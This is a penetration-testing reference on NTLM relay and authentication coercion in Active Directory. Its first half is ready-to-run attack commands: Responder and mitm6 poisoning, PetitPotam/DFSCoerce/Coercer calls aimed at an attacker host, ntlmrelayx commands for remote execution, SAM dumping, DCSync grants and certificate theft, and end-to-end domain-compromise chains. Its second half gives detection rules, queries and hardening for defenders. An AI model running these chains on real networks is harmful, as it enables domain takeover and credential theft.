# NTLM Relay & Authentication Coercion

Deep reference for poisoning, capturing, coercing, and relaying NTLM authentication in Active Directory — still one of the most reliable paths from a low-priv foothold (or even unauthenticated) to domain compromise in 2025-2026. Companion to `ad-enumeration-and-attacks.md`, `adcs-esc-attacks.md` (ESC8/ESC11), and `kerberos-attacks.md`.

> Core rule: NTLM relay **cannot reflect** back to the originating host (patched). You relay machine/user authentication to a *different* target where the relevant signing/EPA protection is off. Capture (offline crack) vs relay (immediate use) are two different goals — choose based on whether you can crack or whether signing is disabled.

---

## 1. Pick Your Targets First

```bash
# Which hosts have SMB signing DISABLED → relayable for SMB:
nxc smb <range> -u '' -p '' --gen-relay-list relay_targets.txt
nxc smb <range> -u user -p pass --gen-relay-list relay_targets.txt
# LDAP relays need: LDAP signing not required AND LDAPS channel binding (EPA) not enforced (default on many DCs).
# AD CS HTTP enrollment (ESC8) needs EPA not enforced on /certsrv.
```

---

## 2. Capture / Poison (passive-ish → offline crack)

### Responder (LLMNR / NBT-NS / mDNS poisoning)
```bash
sudo responder -I eth0                              # default: poisons + serves rogue servers
sudo responder -I eth0 -wv                          # verbose, with WPAD
# Captured NetNTLMv2 → /usr/share/responder/logs/*.txt → crack:
hashcat -m 5600 hash.txt rockyou.txt
```
> When you intend to **relay** (not capture), turn OFF Responder's SMB/HTTP servers so they don't answer first:
> set `SMB = Off` and `HTTP = Off` in `/etc/responder/Responder.conf`.

### mitm6 (IPv6 DNS takeover → relay to LDAP, very high impact)
```bash
sudo mitm6 -d domain.local                          # become the victim's DNS via DHCPv6
# pair with ntlmrelayx → LDAP (below). mitm6 coerces machine auth as boxes renew leases.
```

---

## 3. Coerce (force a specific machine/DC to authenticate to you)

A low-priv domain account (sometimes unauthenticated) can force a target — often a **Domain Controller** — to authenticate outbound to your listener.

```bash
# PetitPotam — MS-EFSR (EfsRpcOpenFileRaw etc.); modern forks include unauth/auth-bypass pipes
python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>                       # try unauth

# PrinterBug / SpoolSample — MS-RPRN (Print Spooler must be up)
python3 dementor.py <ATTACKER_IP> <DC_IP> -u user -p pass -d domain.local
SpoolSample.exe <DC> <ATTACKER_HOST>                              # Windows

# DFSCoerce — MS-DFSNM (works even when Spooler/EFS disabled)
python3 dfscoerce.py -u user -p pass <ATTACKER_IP> <DC_IP>

# ShadowCoerce — MS-FSRVP ;  Coercer = does all of them automatically (17+ methods)
coercer coerce -u user -p pass -t <DC_IP> -l <ATTACKER_IP>
coercer scan  -u user -p pass -t <DC_IP>                          # which methods work

# NetExec built-in
nxc smb <DC_IP> -u user -p pass -M coerce_plus -o LISTENER=<ATTACKER_IP>
```

### Coerce over HTTP (needed for HTTP/LDAP relay targets like ESC8)
SMB coercion gives SMB auth; to relay to HTTP/LDAP you usually need **HTTP** auth from the victim → its **WebClient** (WebDAV) service must be running. Force it on or use a host where it runs:
```bash
# Check/start WebClient remotely
nxc smb <target> -u user -p pass -M webdav            # is WebClient running?
# Drop a .searchConnector-ms / .library-ms on a share the victim opens to auto-start WebClient.
# Then coerce with an HTTP listener (use the @ATTACKER@port / WebDAV UNC form in the coercion tool).
```

---

## 4. Relay (ntlmrelayx targets & actions)

```bash
# --- SMB target: execute / dump SAM (signing must be off) ---
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -enc <b64>"
impacket-ntlmrelayx -tf relay_targets.txt -smb2support                 # default: dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks          # keep sessions in SOCKS

# --- LDAP/LDAPS on a DC ---
impacket-ntlmrelayx -t ldap://<DC_IP>  --dump-laps --dump-adcs --dump-gmsa   # read-only recon
impacket-ntlmrelayx -t ldaps://<DC_IP> --escalate-user lowuser               # grant DCSync to lowuser (if writable)
impacket-ntlmrelayx -t ldap://<DC_IP>  --delegate-access                      # set RBCD from relayed machine acct
impacket-ntlmrelayx -t ldap://<DC_IP>  --shadow-credentials --shadow-target 'dc01$'   # KeyCredentialLink

# --- AD CS (ESC8 HTTP / ESC11 RPC) ---
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
impacket-ntlmrelayx -t rpc://<CA> -rpc-mode ICPR -icpr-ca-name CA_NAME --adcs --template Machine
# → relayed DC$/machine cert; finish with: certipy auth -pfx out.pfx -dc-ip <DC>
```

### Classic high-impact chains
```
mitm6 + ntlmrelayx -t ldaps://DC --delegate-access   → RBCD on a relayed workstation → SYSTEM
PetitPotam(DC) + ntlmrelayx -t http://CA --adcs       → DC$ certificate → DCSync (ESC8)
Responder(off SMB/HTTP) + ntlmrelayx -tf targets -c   → SAM dump / exec on signing-off hosts
DFSCoerce(DC) + ntlmrelayx -t ldap --shadow-credentials --shadow-target dc01$  → DC TGT
```

---

## 5. Defenses You'll See (and how they change the play)

| Control | Effect | Workaround |
|---------|--------|------------|
| SMB signing required | no SMB relay | relay to LDAP/HTTP/RPC instead, or crack the captured hash |
| LDAP signing + channel binding (EPA) | no LDAP relay | target HTTP (ESC8) / RPC (ESC11), or SMB |
| EPA on /certsrv | no ESC8 | ESC11 (RPC), or other ESC |
| LLMNR/NBT-NS disabled | Responder yields less | mitm6 (IPv6), coercion |
| RestrictNTLM / NTLM disabled | no NTLM at all | Kerberos relay (specialized), other vectors |

> 2025 note: Microsoft has been moving to deprecate NTLM and enable signing/EPA by default — but mixed estates keep relay alive. Always test what's actually enforced (nxc shows signing; `--dump-adcs` reveals EPA-less CAs).

---

## 6. Cheatsheet

```bash
# RELAY TARGETS
nxc smb <range> -u u -p p --gen-relay-list targets.txt

# CAPTURE
sudo responder -I eth0 -wv          # (SMB/HTTP off in conf when relaying)
sudo mitm6 -d domain.local

# COERCE
PetitPotam.py -u u -p p <ATK> <DC>
dfscoerce.py  -u u -p p <ATK> <DC>
coercer coerce -u u -p p -t <DC> -l <ATK>
nxc smb <DC> -u u -p p -M coerce_plus

# RELAY
impacket-ntlmrelayx -tf targets.txt -smb2support -c "<cmd>"
impacket-ntlmrelayx -t ldaps://<DC> --delegate-access
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
certipy auth -pfx out.pfx -dc-ip <DC>
```

---

## Detection & Mitigation

Defensive guidance for the techniques above: LLMNR/NBT-NS/mDNS poisoning (Responder), IPv6/DHCPv6 DNS takeover (mitm6), coercion (PetitPotam/MS-EFSR, PrinterBug/MS-RPRN, DFSCoerce/MS-DFSNM, ShadowCoerce/MS-FSRVP), and NTLM relay to SMB, LDAP(S), and AD CS (ESC8 HTTP / ESC11 RPC). The two most durable defenses are **enforced signing/channel-binding everywhere** and **eliminating the name-resolution poisoning + NTLM exposure** that feed relay.

### Telemetry & Log Sources

- **Domain Controllers & member servers — Security log**:
  - `4624` — successful logon. **Logon Type 3 + NTLM** authentication, especially for **machine accounts (`$`)** authenticating from a host that is not themselves, is the core relay signal.
  - `4625` — failed logon (relay/spray noise, EPA mismatches).
  - `4768`/`4769` — to correlate post-relay Kerberos activity (e.g. relayed-cert TGT for a DC).
  - `4662` / `5136` — directory writes from relayed LDAP sessions: `--escalate-user` (DCSync grant via `Replicating Directory Changes`), `--delegate-access` (RBCD via `msDS-AllowedToActOnBehalfOfOtherIdentity`), `--shadow-credentials` (`msDS-KeyCredentialLink`).
  - `5145` — detailed file-share access; coercion via EFSRPC/DFSNM touches named pipes (`\PIPE\lsarpc`, `\PIPE\efsrpc`, `\PIPE\netdfs`, `\PIPE\spoolss`, `\PIPE\FssagentRpc`).
  - `4741`/`4742` — computer account created/modified (relay-driven RBCD machine accounts).
- **AD CS CA host** — `4886`/`4887` issuance, IIS logs for `/certsrv/certfnsh.asp` (ESC8), unexpected ICPR/RPC enrollment (ESC11); see `adcs-esc-attacks.md`.
- **DNS** — DNS server analytic/audit logs for sudden DHCPv6-driven IPv6 DNS registration / WPAD answers (mitm6), and dynamic-update anomalies.
- **Network / NDR** — LLMNR (UDP 5355), NBT-NS (UDP 137), mDNS (UDP 5353) responses from non-authoritative hosts; rogue DHCPv6 (RA/Advertise) traffic; WPAD requests; inbound MS-RPRN/MS-EFSR/MS-DFSNM/MS-FSRVP RPC to DCs from non-admin hosts.
- **EDR / Sysmon** — Sysmon Event 22 (DNS query for `wpad`, `isatap`), Event 3 (network connections to attacker listeners), pipe events (17/18) for the coercion pipes above; detection of Responder/mitm6/ntlmrelayx/Coercer tooling on endpoints.
- **Endpoint config telemetry** — verify enforced state of SMB signing, LDAP signing + channel binding, and EPA via host inventory (don't assume policy = enforcement).

### Detection Logic

Key behavioral patterns:

- **Relay (the universal tell)** — `4624` Logon Type 3, **NTLM** package, where the authenticating account is a **machine account** and the `WorkstationName` / source IP does not match that machine — i.e. one machine's identity arriving from somewhere else. Correlate immediate sensitive directory writes (4662/5136) or cert issuance.
- **Coercion** — inbound RPC to a DC on `MS-EFSR` (EfsRpcOpenFileRaw etc.), `MS-RPRN` (`RpcRemoteFindFirstPrinterChangeNotification`), `MS-DFSNM` (`NetrDfsAddStdRoot`), or `MS-FSRVP`, from a non-administrative source, followed by an outbound auth from the DC to that source. Pipe access (`5145` / Sysmon 17/18) to `efsrpc`/`netdfs`/`spoolss`/`FssagentRpc`.
- **LLMNR/NBT-NS/mDNS poisoning** — repeated multicast name-resolution answers from a single host claiming many names; spike in NTLMv2 challenge/response to a non-server host.
- **mitm6** — a workstation suddenly advertising itself as IPv6 DNS / WPAD; bursts of machine NTLM auth as DHCPv6 leases renew.
- **Post-relay LDAP abuse** — `5136` granting `Replicating Directory Changes` to a non-DC principal (DCSync escalation), or writing RBCD/KeyCredentialLink attributes (cross-reference `kerberos-attacks.md`).

```yaml
title: NTLM Relay - Machine Account Authenticating from Foreign Host
id: ntlmrelay-machine-foreign-4624
status: experimental
description: Detects a computer account performing an NTLM network logon from a host that is not itself, the hallmark of an NTLM relay.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
    TargetUserName|endswith: '$'        # machine account
  filter_self:
    TargetUserName|fieldref: WorkstationName   # account name matches source workstation
  condition: selection and not filter_self
fields:
  - TargetUserName
  - WorkstationName
  - IpAddress
  - TargetServerName
falsepositives:
  - Some legitimate cluster/backup software uses machine accounts over NTLM (baseline and allowlist)
level: high
tags:
  - attack.credential_access
  - attack.lateral_movement
  - attack.t1557.001
```

```yaml
title: Authentication Coercion - EFSRPC / DFSNM / RPRN Named-Pipe Access on DC
id: coerce-pipe-access-5145
status: experimental
description: Detects access to the named pipes abused by PetitPotam (MS-EFSR), DFSCoerce (MS-DFSNM), PrinterBug (MS-RPRN), and ShadowCoerce (MS-FSRVP) from non-administrative hosts.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: '\\\\*\\IPC$'
    RelativeTargetName:
      - 'efsrpc'
      - 'lsarpc'
      - 'netdfs'
      - 'spoolss'
      - 'FssagentRpc'
  condition: selection
fields:
  - SubjectUserName
  - IpAddress
  - RelativeTargetName
falsepositives:
  - Legitimate printer/DFS administration from known management hosts (allowlist)
level: medium
tags:
  - attack.credential_access
  - attack.t1187
```

```yaml
title: mitm6 - Rogue IPv6 DNS / WPAD Activity
id: mitm6-wpad-sysmon-22
status: experimental
description: Detects WPAD/ISATAP DNS queries and rogue IPv6 DNS behavior associated with mitm6 DHCPv6 takeover.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 22                          # Sysmon DNS query
    QueryName|contains:
      - 'wpad'
      - 'ISATAP'
  condition: selection
fields:
  - Computer
  - QueryName
  - Image
falsepositives:
  - Environments that legitimately use WPAD (disable WPAD and treat any query as suspicious)
level: medium
tags:
  - attack.credential_access
  - attack.t1557
```

KQL (Sentinel / Defender) — post-relay LDAP escalation (DCSync grant or RBCD/Shadow-cred write):

```kql
SecurityEvent
| where EventID in (5136, 4662)
| where AccessMask has_any ("Replicating Directory Changes", "DS-Replication-Get-Changes")
    or AttributeLDAPDisplayName in ("msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-KeyCredentialLink")
| where SubjectUserName !in (KnownDomainControllersAndAdmins)
| project TimeGenerated, Computer, SubjectUserName, AttributeLDAPDisplayName, AccessMask, ObjectDN
| order by TimeGenerated desc
```

Splunk SPL — coercion-driven outbound auth: machine NTLM logon shortly after inbound RPC pipe access:

```spl
index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM Account_Name="*$"
| eval src=Source_Network_Address
| where Workstation_Name!=mvindex(split(Account_Name,"$"),0)
| stats count values(Workstation_Name) as workstations by Account_Name, src
| where count > 1
```

### Hardening & Mitigations

- **Enforce SMB signing everywhere** (require on clients and servers; default-on direction in recent Windows). Removes SMB as a relay target (D3FEND Message Authentication). Verify enforcement with `nxc smb --gen-relay-list` returning empty.
- **Require LDAP signing + LDAP channel binding (EPA)** on all DCs (`LdapEnforceChannelBinding`, `LDAPServerIntegrity`) — defeats LDAP/LDAPS relay (the path to DCSync/RBCD/Shadow-cred escalation).
- **Enable Extended Protection for Authentication (EPA)** on HTTP services that accept NTLM, especially AD CS web enrollment `/certsrv` (kills ESC8) and on Exchange/other web auth; enforce `IF_ENFORCEENCRYPTICERTREQUEST` for the CA RPC interface (kills ESC11). See `adcs-esc-attacks.md`.
- **Disable LLMNR, NBT-NS, and mDNS** (GPO: Turn off multicast name resolution; disable NetBIOS over TCP/IP; disable mDNS) and disable/ harden **WPAD** — removes Responder's poisoning surface (D3FEND DNS/Network configuration).
- **Block rogue DHCPv6 / disable IPv6 where unused** — DHCPv6 Guard / RA Guard on switches, or disable IPv6 if the environment doesn't use it, to neutralize mitm6. Filter inbound DHCPv6 from non-DHCP hosts.
- **Reduce/eliminate NTLM** — audit with `RestrictSendingNTLMTraffic`, move to Kerberos, and where feasible block NTLM (`RestrictNTLM`); fewer NTLM authentications means fewer relayable credentials. Add high-value accounts to **Protected Users** (no NTLM).
- **Mitigate coercion at the RPC layer** — deploy **RPC Filters** to block MS-RPRN, MS-EFSR, MS-DFSNM, and MS-FSRVP from untrusted sources; **disable the Print Spooler** on DCs and servers that don't print (kills PrinterBug); apply current patches (PetitPotam/MS-EFSR hardening). Maps to D3FEND Inbound Traffic Filtering.
- **Disable the WebClient (WebDAV) service** on hosts that don't need it — removes the HTTP-coercion pivot used to reach HTTP/LDAP relay targets (ESC8).
- **Harden delegation & directory ACLs** — set MachineAccountQuota to 0, restrict who can write `msDS-AllowedToActOnBehalfOfOtherIdentity` and `msDS-KeyCredentialLink`, and tightly control `Replicating Directory Changes` so a relayed LDAP session cannot escalate. Cross-reference `kerberos-attacks.md`.
- **Network segmentation & monitoring** — restrict which subnets can reach DC/CA management interfaces; deploy honeytokens/decoy hosts to surface poisoning early (D3FEND Decoy Network Resource).

### MITRE ATT&CK Mapping

| Technique | ID | Detection / Mitigation note |
|-----------|----|------------------------------|
| Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | T1557.001 | Disable LLMNR/NBT-NS/mDNS; enforce SMB/LDAP signing + EPA; alert on machine NTLM logon from foreign host |
| Adversary-in-the-Middle (IPv6/DHCPv6 takeover, mitm6) | T1557 | DHCPv6/RA Guard; disable IPv6 if unused; Sysmon WPAD query detection |
| Forced Authentication (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce) | T1187 | RPC filters for EFSR/RPRN/DFSNM/FSRVP; disable Spooler/WebClient; pipe-access auditing |
| Account Manipulation (relayed LDAP → RBCD / Shadow Credentials) | T1098 | Audit msDS-AllowedToActOnBehalfOfOtherIdentity / msDS-KeyCredentialLink writes; LDAP signing+EPA |
| OS Credential Dumping: DCSync (relayed --escalate-user) | T1003.006 | Restrict & alert on Replicating Directory Changes grants; LDAP channel binding |
| Steal or Forge Authentication Certificates (ESC8/ESC11 via relay) | T1649 | EPA on /certsrv; IF_ENFORCEENCRYPTICERTREQUEST; see adcs-esc-attacks.md |

---

## References

- The Hacker Recipes – NTLM relay — https://www.thehacker.recipes/ad/movement/ntlm/relay
- The Hacker Recipes – Coercion — https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/
- RedTeam-Pentesting – Ultimate Guide to Windows Coercion (2025) — https://blog.redteam-pentesting.de/2025/windows-coercion/
- 0xCZR – NTLM Relay Cheatsheet (2025) — https://www.0xczr.com/tools/NTLM_Relay_Cheatsheet/
- Responder — https://github.com/lgandx/Responder
- mitm6 — https://github.com/dirkjanm/mitm6
- Coercer — https://github.com/p0dalirius/Coercer
- PetitPotam — https://github.com/topotam/PetitPotam ; DFSCoerce — https://github.com/Wh04m1001/DFSCoerce
- dirkjanm – "Relaying credentials everywhere with ntlmrelayx" — https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
